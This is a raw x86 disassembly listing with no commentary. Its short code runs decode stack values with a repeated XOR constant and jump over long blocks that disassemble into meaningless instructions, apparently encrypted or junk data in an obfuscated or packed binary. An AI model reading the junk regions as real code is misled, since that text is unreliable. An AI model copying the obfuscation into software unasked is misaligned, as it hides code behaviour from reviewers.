  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0xaaaf347d
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	(bad)  
  40cc4f:	fsubr  QWORD PTR [ebx]
  40cc51:	lock inc eax
  40cc53:	fidivr DWORD PTR [esi-0x4e]
  40cc56:	sub    BYTE PTR [esi-0x2f],0xdc
  40cc5a:	ins    BYTE PTR es:[edi],dx
  40cc5b:	test   BYTE PTR ds:[eax+0x184dd5f8],dh
  40cc62:	fistp  DWORD PTR [edx]
  40cc64:	xor    DWORD PTR cs:[ebx-0x16c7a6e7],ecx
  40cc6b:	push   eax
  40cc6c:	pop    ebx
  40cc6d:	push   cs
  40cc6e:	xchg   BYTE PTR es:[ebp+0x74],dh
  40cc72:	pop    ebx
  40cc73:	push   cs
  40cc74:	mov    edx,0x1f629d58
  40cc79:	std    
  40cc7a:	pop    ebx
  40cc7b:	jle    0x40cce6
  40cc7d:	bound  ebx,QWORD PTR [esi+0x2d]
  40cc80:	in     al,dx
  40cc81:	adc    DWORD PTR [ebx],esi
  40cc83:	pop    eax
  40cc84:	push   cs
  40cc85:	repnz inc eax
  40cc87:	cli    
  40cc88:	or     BYTE PTR [edx],0x3a
  40cc8b:	mov    ch,0x26
  40cc8d:	jb     0x40ccab
  40cc8f:	int    0x1f
  40cc91:	xor    eax,0x9c5e6441
  40cc96:	mov    edx,0xcf10f439
  40cc9b:	sub    edx,DWORD PTR [edx-0x49]
  40cc9e:	push   es
  40cc9f:	loop   0x40cc5d
  40cca1:	sti    
  40cca2:	lods   eax,DWORD PTR ds:[esi]
  40cca3:	(bad)  
  40cca4:	adc    BYTE PTR [ebp+0x1e],0x92
  40cca8:	ins    DWORD PTR es:[edi],dx
  40cca9:	jecxz  0x40ccfe
  40ccab:	mov    al,ds:0xfc0a01c5
  40ccb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccb1:	arpl   WORD PTR [edi-0x316699b6],sp
  40ccb7:	pop    ebx
  40ccb8:	sti    
  40ccb9:	dec    ebp
  40ccba:	out    0xab,al
  40ccbc:	pop    esp
  40ccbd:	fdivr  QWORD PTR [esp+edx*4+0x47]
  40ccc1:	or     ch,BYTE PTR [edx]
  40ccc3:	addr16 sub al,0x4f
  40ccc6:	out    dx,eax
  40ccc7:	pop    esp
  40ccc8:	or     DWORD PTR [edx],ebx
  40ccca:	iret   
  40cccb:	fidiv  DWORD PTR [eax]
  40cccd:	sbb    ah,bh
  40cccf:	out    dx,al
  40ccd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd1:	sbb    dh,bl
  40ccd3:	pop    ebx
  40ccd4:	mov    ds:0x57d219a9,al
  40ccd9:	pop    ds
  40ccda:	outs   dx,DWORD PTR ds:[esi]
  40ccdb:	dec    eax
  40ccdc:	das    
  40ccdd:	mov    al,ds:0x80ca7bda
  40cce2:	adc    eax,0x4774e29
  40cce7:	sub    eax,0x6e0e9f80
  40ccec:	mov    ecx,0x3959b3d7
  40ccf1:	mov    cs,WORD PTR [ebx+0xeb69810]
  40ccf7:	test   al,0xd0
  40ccf9:	out    0x72,al
  40ccfb:	mov    ebx,0x73cd1c58
  40cd00:	dec    eax
  40cd01:	mul    BYTE PTR [eax+0x21b3fd92]
  40cd07:	xlat   BYTE PTR ds:[ebx]
  40cd08:	sti    
  40cd09:	or     eax,0xc16960ed
  40cd0e:	aad    0xee
  40cd10:	test   al,ah
  40cd12:	stos   BYTE PTR es:[edi],al
  40cd13:	in     al,dx
  40cd14:	pop    eax
  40cd15:	sbb    al,0xfa
  40cd17:	pop    ss
  40cd18:	or     BYTE PTR [eax+eax*8+0x68b1ed9],al
  40cd1f:	xchg   ebx,eax
  40cd20:	lahf   
  40cd21:	cmp    DWORD PTR gs:0xce78354f,eax
  40cd28:	out    0x87,eax
  40cd2a:	push   0x1e
  40cd2c:	das    
  40cd2d:	sbb    BYTE PTR [ebx+0xb5f419d],dh
  40cd33:	adc    cl,BYTE PTR [eax]
  40cd35:	xor    eax,0x9b3f2234
  40cd3a:	xchg   edx,eax
  40cd3b:	jbe    0x40cdb7
  40cd3d:	mov    bh,0x53
  40cd3f:	xchg   edx,eax
  40cd40:	int3   
  40cd41:	and    eax,0xfa9728a
  40cd46:	(bad)  
  40cd47:	add    eax,0xc87f7271
  40cd4c:	sbb    al,0xc2
  40cd4e:	mov    al,0x6
  40cd50:	mov    WORD PTR [edx],fs
  40cd52:	cmp    al,0xfd
  40cd54:	ja     0x40ccee
  40cd56:	cmp    al,0x6f
  40cd58:	idiv   DWORD PTR [ecx+edx*8-0x49ba4c62]
  40cd5f:	push   0xffffffc2
  40cd61:	mov    BYTE PTR [ebp+0x66],0x33
  40cd65:	pop    ebp
  40cd66:	ds (bad) 
  40cd68:	popa   
  40cd69:	int3   
  40cd6a:	jmp    0x5c80:0xfd412148
  40cd71:	and    edx,DWORD PTR [edx+ecx*1+0x7e]
  40cd75:	pop    es
  40cd76:	mov    eax,0xc9163198
  40cd7b:	cs out 0xc3,eax
  40cd7e:	stos   WORD PTR es:[edi],ax
  40cd80:	mov    esi,0x4a67af0d
  40cd85:	push   ebx
  40cd86:	ins    DWORD PTR es:[edi],dx
  40cd87:	xchg   DWORD PTR [ebp+0x2d98a16e],ebx
  40cd8d:	and    DWORD PTR [ecx-0x70],edi
  40cd90:	and    BYTE PTR [eax+ebx*8-0x47cbca9a],dl
  40cd97:	ficom  WORD PTR [edx-0x66]
  40cd9a:	sub    ecx,edi
  40cd9c:	sub    bl,ch
  40cd9e:	pop    edx
  40cd9f:	lea    edx,[eax*2-0x5ce904e1]
  40cda6:	inc    eax
  40cda7:	ret    0x6b51
  40cdaa:	leave  
  40cdab:	cld    
  40cdac:	stos   DWORD PTR es:[edi],eax
  40cdad:	lahf   
  40cdae:	ins    DWORD PTR es:[di],dx
  40cdb0:	aas    
  40cdb1:	adc    bh,BYTE PTR [esi+edi*4]
  40cdb4:	and    ebp,DWORD PTR [edi-0x17]
  40cdb7:	mov    DWORD PTR [ebx-0x48cddd92],ebx
  40cdbd:	fidiv  DWORD PTR [edx-0x29261070]
  40cdc3:	cli    
  40cdc4:	cmp    al,0xe3
  40cdc6:	mov    ecx,0x71f93121
  40cdcb:	in     al,0x58
  40cdcd:	sbb    dl,BYTE PTR [ebx+0x50]
  40cdd0:	fwait
  40cdd1:	test   eax,0x46d662f0
  40cdd6:	dec    edi
  40cdd7:	pop    es
  40cdd8:	push   cs
  40cdd9:	mov    DWORD PTR [ebp-0x78b3b1c4],ecx
  40cddf:	out    0x9f,al
  40cde1:	ret    0x15fd
  40cde4:	int3   
  40cde5:	adc    DWORD PTR [esi+0x5b63545],esp
  40cdeb:	jmp    0x72fd761d
  40cdf0:	mov    bl,0x7c
  40cdf2:	es ret 
  40cdf4:	add    eax,DWORD PTR [edx]
  40cdf6:	mov    eax,ds:0x61d54de6
  40cdfb:	lock lea esp,[edx]
  40cdfe:	mov    ebx,0x14a2554b
  40ce03:	pushf  
  40ce04:	mov    al,0x8d
  40ce06:	rol    BYTE PTR [eax],1
  40ce08:	into   
  40ce09:	(bad)  
  40ce0a:	(bad)  
  40ce0b:	out    dx,al
  40ce0c:	jae    0x40ce51
  40ce0e:	add    edx,edx
  40ce10:	clc    
  40ce11:	jmp    0x7c48bb7
  40ce16:	fcmovu st,st(6)
  40ce18:	ins    DWORD PTR es:[edi],dx
  40ce19:	ins    BYTE PTR es:[edi],dx
  40ce1a:	mov    al,0x4c
  40ce1c:	jg     0x40ce0d
  40ce1e:	(bad)  
  40ce1f:	mov    DWORD PTR [eax-0x6b],0xad3f9a7
  40ce26:	js     0x40cdd6
  40ce28:	dec    esi
  40ce29:	out    0xaf,al
  40ce2b:	test   eax,0x9a5769a5
  40ce30:	inc    DWORD PTR [edi]
  40ce32:	or     dl,dl
  40ce34:	xchg   dl,al
  40ce36:	pop    esp
  40ce37:	das    
  40ce38:	in     al,dx
  40ce39:	xchg   BYTE PTR [ecx-0x80],dl
  40ce3c:	push   edx
  40ce3d:	jmp    0x896:0x3bef569f
  40ce44:	inc    ecx
  40ce45:	test   BYTE PTR [ecx-0x49],bh
  40ce48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce49:	sbb    cl,BYTE PTR [eax]
  40ce4b:	aad    0xf
  40ce4d:	bound  ebx,QWORD PTR [edx+0x63]
  40ce50:	push   ds
  40ce51:	hlt    
  40ce52:	(bad)  
  40ce53:	mov    ah,ch
  40ce55:	jne    0x40cddc
  40ce57:	cmp    ebp,0x100fbb50
  40ce5d:	mov    eax,ds:0xd46ed34f
  40ce62:	call   0x82e215bf
  40ce67:	adc    DWORD PTR [ebx+edi*1+0x53],0x2c
  40ce6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce6d:	rcr    BYTE PTR [ecx+0x176f8f14],cl
  40ce73:	adc    eax,0x26b2971e
  40ce78:	pop    ebx
  40ce79:	std    
  40ce7a:	jp     0x40ce9a
  40ce7c:	rol    BYTE PTR [ecx-0x3d],cl
  40ce7f:	xchg   esi,eax
  40ce80:	jae    0x40ce3b
  40ce82:	clc    
  40ce83:	gs scas eax,DWORD PTR es:[edi]
  40ce85:	inc    ebx
  40ce86:	daa    
  40ce87:	mov    ah,0x7a
  40ce89:	or     BYTE PTR [ebx-0x45],ch
  40ce8c:	jl     0x40ce57
  40ce8e:	dec    esi
  40ce8f:	into   
  40ce90:	arpl   dx,bx
  40ce92:	mov    bl,0x40
  40ce94:	shl    DWORD PTR [eax-0x7b87596e],0xdc
  40ce9b:	dec    eax
  40ce9c:	das    
  40ce9d:	dec    eax
  40ce9e:	xor    dl,dh
  40cea0:	dec    edi
  40cea1:	inc    ebx
  40cea2:	out    0x92,eax
  40cea4:	cli    
  40cea5:	test   eax,0xb376e349
  40ceaa:	fld    DWORD PTR [esi-0x161e4519]
  40ceb0:	mov    esi,0xc3f1f49f
  40ceb5:	or     al,0x61
  40ceb7:	cdq    
  40ceb8:	fisub  WORD PTR [esi+eiz*2+0x7e]
  40cebc:	repnz push edx
  40cebe:	cld    
  40cebf:	fwait
  40cec0:	push   esi
  40cec1:	int    0x5d
  40cec3:	fisub  WORD PTR [ebp+0x48d4dbeb]
  40cec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceca:	fwait
  40cecb:	push   es
  40cecc:	jl     0x40cf21
  40cece:	mov    esp,0xa59ca14d
  40ced3:	cmp    BYTE PTR [ecx+eiz*4-0x30161795],0xff
  40cedb:	shr    DWORD PTR [ecx+0x1b9e1ef8],cl
  40cee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee2:	mov    ch,0x3e
  40cee4:	not    bh
  40cee6:	ficomp DWORD PTR [edi]
  40cee8:	clc    
  40cee9:	sub    bl,BYTE PTR [ecx]
  40ceeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceec:	sti    
  40ceed:	das    
  40ceee:	mov    edi,ebx
  40cef0:	or     DWORD PTR [ebx+0x50],eax
  40cef3:	sbb    ebp,DWORD PTR [esi]
  40cef5:	xchg   ecx,eax
  40cef6:	push   ebp
  40cef7:	mov    eax,ds:0x12eea804
  40cefc:	iret   
  40cefd:	repnz (bad) 
  40ceff:	jmp    0x3691d9ab
  40cf04:	mov    ds:0xa6ba41e3,al
  40cf09:	inc    edx
  40cf0a:	imul   edi,DWORD PTR [esi+0x46],0x52
  40cf0e:	push   ds
  40cf0f:	stos   DWORD PTR es:[edi],eax
  40cf10:	cli    
  40cf11:	cmp    ebp,ebx
  40cf13:	aad    0x90
  40cf15:	cli    
  40cf16:	in     al,dx
  40cf17:	mov    cl,BYTE PTR [eax-0xa]
  40cf1a:	mov    bh,0xc7
  40cf1c:	mov    ch,0xdc
  40cf1e:	or     BYTE PTR [ebx-0x59e20475],bh
  40cf24:	xor    eax,0x61d9f175
  40cf29:	and    al,0xd2
  40cf2b:	pop    ds
  40cf2c:	mov    bl,BYTE PTR [edi+0x6f]
  40cf2f:	xor    edx,DWORD PTR [ebp+0x742a100c]
  40cf35:	jmp    0xeafbba6d
  40cf3a:	or     DWORD PTR [eax-0x57bc810],edx
  40cf40:	int3   
  40cf41:	(bad)  
  40cf42:	clc    
  40cf43:	js     0x40ceee
  40cf45:	fsub   DWORD PTR [ebx-0x8ab9b7b]
  40cf4b:	les    edx,FWORD PTR ds:0xd777e1d9
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0xf5
  40cf80:	(bad)  
  40cf81:	idiv   dl
  40cf83:	and    DWORD PTR [esi+0x7d7d7e7e],edx
  40cf89:	jle    0x40d009
  40cf8b:	popf   
  40cf8c:	or     dl,dh
  40cf8e:	in     eax,dx
  40cf8f:	mov    DWORD PTR [edx*8+0x75fcddd0],esi
  40cf96:	test   eax,0xb80edac
  40cf9b:	jns    0x40cfdd
  40cf9d:	jno    0x40cf8d
  40cf9f:	les    edx,FWORD PTR ds:0x73a5b6b1
  40cfa5:	xchg   BYTE PTR [ebx+0x77],al
  40cfa8:	(bad)  
  40cfaa:	in     eax,0xed
  40cfac:	(bad)  
  40cfad:	jp     0x40cfca
  40cfaf:	outs   dx,DWORD PTR ds:[esi]
  40cfb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfb1:	jle    0x40cf7e
  40cfb3:	and    dh,cl
  40cfb5:	jmp    0x40d022
  40cfb7:	lock adc eax,0x52d1f543
  40cfbd:	xor    ecx,DWORD PTR [ebx-0x6e]
  40cfc0:	sub    eax,0x836a0111
  40cfc5:	dec    ebp
  40cfc6:	pop    edx
  40cfc7:	mov    ch,BYTE PTR [edi]
  40cfc9:	pop    ecx
  40cfca:	jecxz  0x40cfce
  40cfcc:	cmp    al,0x9d
  40cfce:	ins    BYTE PTR es:[edi],dx
  40cfcf:	mov    al,0x6d
  40cfd1:	fcomp  st(4)
  40cfd3:	je     0x40cfaf
  40cfd5:	lds    eax,FWORD PTR [eax-0x735d22c5]
  40cfdb:	ret    
  40cfdc:	inc    ebx
  40cfdd:	pop    ebp
  40cfde:	jo     0x40d054
  40cfe0:	sbb    eax,0x94c9351
  40cfe5:	adc    al,dl
  40cfe7:	stos   DWORD PTR es:[edi],eax
  40cfe8:	or     eax,0x6dd40209
  40cfed:	xchg   DWORD PTR [eax],ebx
  40cfef:	lods   eax,DWORD PTR ds:[esi]
  40cff0:	inc    ecx
  40cff1:	sbb    dl,BYTE PTR [eax+0x4a27fcfb]
  40cff7:	fistp  DWORD PTR [esi]
  40cff9:	imul   ecx,DWORD PTR [ebp+0x61921d90],0x45
  40d000:	inc    edx
  40d001:	sbb    bh,dl
  40d003:	ja     0x40d00f
  40d005:	sbb    dl,BYTE PTR [esi+esi*4-0x6e]
  40d009:	or     DWORD PTR [ebx+esi*4-0x46b6d7e8],eax
  40d010:	pop    ss
  40d011:	fsubr  st,st(1)
  40d013:	cmp    BYTE PTR [ecx-0x68],0xfa
  40d017:	repz sar BYTE PTR [ebx-0x50275c00],1
  40d01e:	gs loopne 0x40cfbd
  40d021:	sbb    bl,ah
  40d023:	adc    BYTE PTR [eax-0x3],0x1c
  40d027:	xchg   edx,eax
  40d028:	pop    esi
  40d029:	fimul  DWORD PTR [esp+eiz*8+0x6420d7f3]
  40d030:	add    BYTE PTR [edi+edi*8+0x11],cl
  40d034:	call   0xac47:0x592e25
  40d03b:	push   ss
  40d03c:	mov    eax,ds:0xc96d981d
  40d041:	xor    al,0x73
  40d043:	sbb    edi,0xffffff80
  40d046:	outs   dx,BYTE PTR ds:[esi]
  40d047:	mov    ds:0xe8509f53,al
  40d04c:	xor    BYTE PTR ds:0xb4fc4405,bl
  40d052:	xchg   edx,eax
  40d053:	xchg   edi,ebp
  40d055:	push   edi
  40d056:	pop    edi
  40d057:	push   ebp
  40d058:	mov    BYTE PTR [esi-0x6ad60bc7],bl
  40d05e:	sbb    BYTE PTR [esi],ah
  40d060:	ret    
  40d061:	popf   
  40d062:	enter  0x51e,0x90
  40d066:	fisttp WORD PTR [edx-0x78e34bd1]
  40d06c:	test   BYTE PTR [ebx],dh
  40d06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d06f:	test   DWORD PTR [ebp+edx*1+0x2c],edi
  40d073:	adc    esp,DWORD PTR [edx+eax*4-0x532389c]
  40d07a:	fsubr  QWORD PTR [ebx+0x39dee117]
  40d080:	(bad)  
  40d081:	cwde   
  40d082:	mov    ds:0x3e2921ef,eax
  40d087:	push   es
  40d088:	pop    ebx
  40d089:	mov    al,0x4a
  40d08b:	adc    al,0xf7
  40d08d:	inc    ebx
  40d08e:	ret    0x5e4d
  40d091:	sub    eax,esp
  40d093:	out    dx,al
  40d094:	pop    ecx
  40d095:	inc    eax
  40d096:	sub    eax,0x78a29e7
  40d09b:	out    0x3a,eax
  40d09d:	jo     0x40d075
  40d09f:	push   ebx
  40d0a0:	in     al,dx
  40d0a1:	sar    esi,0xaa
  40d0a4:	inc    edi
  40d0a5:	stos   BYTE PTR es:[edi],al
  40d0a6:	pop    esi
  40d0a7:	cwde   
  40d0a8:	imul   BYTE PTR [ebx+0x65]
  40d0ab:	outs   dx,BYTE PTR ds:[esi]
  40d0ac:	mov    edx,esp
  40d0ae:	jae    0x40d074
  40d0b0:	mov    bh,0xfc
  40d0b2:	sub    DWORD PTR [edx],esi
  40d0b4:	mov    dl,0x91
  40d0b6:	push   ecx
  40d0b7:	xchg   ecx,eax
  40d0b8:	cmc    
  40d0b9:	lods   eax,DWORD PTR ds:[esi]
  40d0ba:	jno    0x40d139
  40d0bc:	out    dx,al
  40d0bd:	fbstp  TBYTE PTR [ebp+0x1c]
  40d0c0:	push   edi
  40d0c1:	or     dh,ah
  40d0c3:	push   0x12
  40d0c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0c6:	lods   ax,WORD PTR ds:[esi]
  40d0c8:	mov    ah,dh
  40d0ca:	push   es
  40d0cb:	fstp   QWORD PTR [eax]
  40d0cd:	push   edi
  40d0ce:	icebp  
  40d0cf:	xchg   edi,eax
  40d0d0:	or     bh,BYTE PTR [esi]
  40d0d2:	xchg   edx,eax
  40d0d3:	and    ah,ah
  40d0d5:	in     al,dx
  40d0d6:	cs int 0xc0
  40d0d9:	pop    eax
  40d0da:	mov    ah,0xbb
  40d0dc:	in     eax,dx
  40d0dd:	je     0x40d110
  40d0df:	add    eax,eax
  40d0e1:	ret    
  40d0e2:	mov    esi,0x2c28c511
  40d0e7:	adc    al,0x1c
  40d0e9:	in     al,dx
  40d0ea:	push   ebx
  40d0eb:	jb     0x40d07c
  40d0ed:	loop   0x40d132
  40d0ef:	xor    eax,0x397b41b5
  40d0f4:	xchg   ebx,eax
  40d0f5:	sub    BYTE PTR [edi+eiz*2-0xc5b0bb],0x89
  40d0fd:	mov    ecx,0xebf4125c
  40d102:	dec    ebx
  40d103:	out    dx,eax
  40d104:	addr16 push edi
  40d106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d107:	out    dx,al
  40d108:	mov    BYTE PTR [ebx-0x63],bh
  40d10b:	mov    al,BYTE PTR [esi+0x427f4666]
  40d111:	cmp    eax,DWORD PTR [eax]
  40d113:	std    
  40d114:	retf   
  40d115:	cmp    al,0x44
  40d117:	pushf  
  40d118:	aam    0x3a
  40d11a:	jne    0x40d18a
  40d11c:	xchg   edx,eax
  40d11d:	fld    DWORD PTR [esi+edi*1]
  40d120:	mov    ah,BYTE PTR [edx+0x3]
  40d123:	cmp    al,0x8b
  40d125:	pusha  
  40d126:	dec    ecx
  40d127:	ins    DWORD PTR es:[edi],dx
  40d128:	inc    edi
  40d129:	mov    BYTE PTR [ecx+0x18f5763],dh
  40d12f:	aas    
  40d130:	xor    edx,esi
  40d132:	xchg   edx,eax
  40d133:	inc    ebx
  40d134:	out    0xbf,eax
  40d136:	inc    ebp
  40d137:	cmp    esi,esp
  40d139:	retf   0x749
  40d13c:	pop    edx
  40d13d:	push   cs
  40d13e:	out    dx,al
  40d13f:	jp     0x40d11e
  40d141:	(bad)  
  40d142:	dec    eax
  40d143:	retf   
  40d144:	xor    DWORD PTR [ecx],0xffffffcc
  40d147:	test   eax,0xd5141049
  40d14c:	cmp    BYTE PTR [esp+edx*8-0x595e616a],cl
  40d153:	push   0x8aadf579
  40d158:	xchg   DWORD PTR [edi-0x60],ecx
  40d15b:	lods   eax,DWORD PTR ds:[esi]
  40d15c:	xchg   ecx,eax
  40d15d:	(bad)  
  40d15e:	cmp    ch,BYTE PTR [eax+0x25]
  40d161:	daa    
  40d162:	cdq    
  40d163:	in     al,0x86
  40d165:	jg     0x40d16f
  40d167:	sbb    ebx,eax
  40d169:	lahf   
  40d16a:	jmp    0x75db:0xff9e47bc
  40d171:	daa    
  40d172:	stos   BYTE PTR es:[edi],al
  40d173:	add    al,0xd0
  40d175:	cli    
  40d176:	sbb    al,0x7b
  40d178:	cs mov edi,0x3527476
  40d17e:	lock push 0x7395f2ba
  40d184:	pop    edx
  40d185:	pop    edi
  40d186:	pop    DWORD PTR [edx+0x2292d3ee]
  40d18c:	dec    esi
  40d18d:	lds    ecx,FWORD PTR [eax+0x5c]
  40d190:	jg     0x40d1fc
  40d192:	rcl    BYTE PTR [eax+0x37],cl
  40d195:	ficom  DWORD PTR [ebx+0x2d11c0ca]
  40d19b:	cmp    al,0x3
  40d19d:	pop    ebp
  40d19e:	jns    0x40d191
  40d1a0:	sub    al,0x94
  40d1a2:	xchg   ebp,eax
  40d1a3:	cli    
  40d1a4:	retf   
  40d1a5:	jno    0x40d1a2
  40d1a7:	dec    eax
  40d1a8:	push   ebx
  40d1a9:	(bad)  
  40d1aa:	lock int 0x11
  40d1ad:	xchg   BYTE PTR [ebp+0x391f5262],bl
  40d1b3:	(bad)  
  40d1b4:	mov    al,0x2f
  40d1b6:	dec    ebp
  40d1b7:	ret    0xd1f2
  40d1ba:	or     ebp,edi
  40d1bc:	daa    
  40d1bd:	outs   dx,BYTE PTR ds:[esi]
  40d1be:	outs   dx,BYTE PTR ds:[esi]
  40d1bf:	rol    edi,0x2
  40d1c2:	jmp    0x6341:0xb8774a67
  40d1c9:	xlat   BYTE PTR ds:[ebx]
  40d1ca:	je     0x40d189
  40d1cc:	push   0xd
  40d1ce:	mov    DWORD PTR [esi+0x57],0xe013a616
  40d1d5:	jg     0x40d1af
  40d1d7:	iret   
  40d1d8:	nop
  40d1d9:	cmp    eax,0xf419a0b6
  40d1de:	xchg   DWORD PTR [ecx+0x4ce56b32],edi
  40d1e4:	jp     0x40d1b1
  40d1e6:	sub    BYTE PTR [esi+ebp*2],dh
  40d1e9:	mov    WORD PTR [ebx-0xf437af6],ds
  40d1ef:	shr    dl,0x4
  40d1f2:	test   eax,0x7ff0cdf7
  40d1f7:	adc    DWORD PTR [ecx-0x39],ebp
  40d1fa:	enter  0x8a69,0xbf
  40d1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ff:	pop    ecx
  40d200:	fldenv es:[esi]
  40d203:	fcom   QWORD PTR [ebp+edi*4-0x4b5f43db]
  40d20a:	ins    BYTE PTR es:[edi],dx
  40d20b:	xchg   ebp,eax
  40d20c:	cmc    
  40d20d:	leave  
  40d20e:	or     eax,0x71c3ce16
  40d213:	shr    DWORD PTR [ebx-0x1d9fa41a],cl
  40d219:	enter  0xdae9,0x91
  40d21d:	test   DWORD PTR [ecx+0x2a69d051],ebp
  40d223:	test   DWORD PTR [ecx],ebp
  40d225:	test   DWORD PTR [ecx-0x1586195e],esi
  40d22b:	fnstcw WORD PTR ds:0x4f191e6d
  40d231:	daa    
  40d232:	ins    DWORD PTR es:[edi],dx
  40d233:	test   ecx,ecx
  40d235:	xor    bl,cl
  40d237:	icebp  
  40d238:	mov    esi,0xa0c254e6
  40d23d:	aaa    
  40d23e:	add    dh,ah
  40d240:	sbb    ch,BYTE PTR [esi+0x77d50856]
  40d246:	sar    BYTE PTR [edi+eiz*8+0x33],0x8a
  40d24b:	ret    
  40d24c:	sbb    eax,0xb03fbbc3
  40d251:	sub    dl,BYTE PTR [ecx+0x124190b4]
  40d257:	or     dl,cl
  40d259:	fidiv  DWORD PTR [esi-0x2fc03ddb]
  40d25f:	cmovp  esi,DWORD PTR [edi+0x4]
  40d263:	jg     0x40d2be
  40d265:	fadd   DWORD PTR [ecx+0x1d0f7894]
  40d26b:	sbb    eax,0x4a1af098
  40d270:	pxor   mm2,QWORD PTR [eax+0x54]
  40d274:	jge    0x40d25b
  40d276:	outs   dx,DWORD PTR ds:[esi]
  40d277:	inc    edi
  40d278:	or     DWORD PTR [edx+ecx*4-0x6bc9e6af],0x34
  40d280:	clc    
  40d281:	pop    ds
  40d282:	jle    0x40d20d
  40d284:	retf   0x6f14
  40d287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d288:	pop    ds
  40d289:	add    al,0x6
  40d28b:	cli    
  40d28c:	and    esi,DWORD PTR [ebx+0x5b]
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	pop    es
  40d2d1:	in     al,dx
  40d2d2:	cmp    eax,0x7e952cd9
  40d2d7:	jle    0x40d356
  40d2d9:	jge    0x40d359
  40d2db:	jle    0x40d34f
  40d2dd:	ja     0x40d2e8
  40d2df:	je     0x40d2d2
  40d2e1:	in     al,dx
  40d2e2:	cmp    DWORD PTR [ebx+0x45fd09f0],eax
  40d2e8:	sahf   
  40d2e9:	xchg   ecx,eax
  40d2ea:	mov    ds:0xbcc0f142,eax
  40d2ef:	iret   
  40d2f0:	loopne 0x40d2a6
  40d2f2:	mov    ecx,0xdef46a2e
  40d2f7:	dec    eax
  40d2f8:	or     ecx,ebx
  40d2fa:	sub    DWORD PTR [ecx+0x5e],ecx
  40d2fd:	and    esp,DWORD PTR [esi+eax*2+0x1737f8f6]
  40d304:	icebp  
  40d305:	add    DWORD PTR [esi+esi*4+0xabbe8cb],0xffffff8f
  40d30d:	arpl   WORD PTR [edx-0x12988b0],di
  40d313:	ret    
  40d314:	and    DWORD PTR [ebx+ecx*8],ecx
  40d317:	add    edx,ecx
  40d319:	or     ebp,DWORD PTR [edx+0x31]
  40d31c:	mov    WORD PTR [esi+0x4f],ss
  40d31f:	dec    ebx
  40d320:	pushf  
  40d321:	sub    dl,BYTE PTR [esi+0x1ff99bc6]
  40d327:	inc    edx
  40d328:	push   eax
  40d329:	lds    edx,FWORD PTR [edi]
  40d32b:	pusha  
  40d32c:	adc    ebx,esp
  40d32e:	ins    DWORD PTR es:[edi],dx
  40d32f:	test   BYTE PTR [edi],bl
  40d331:	adc    DWORD PTR [edi+eiz*8],0xffffffcd
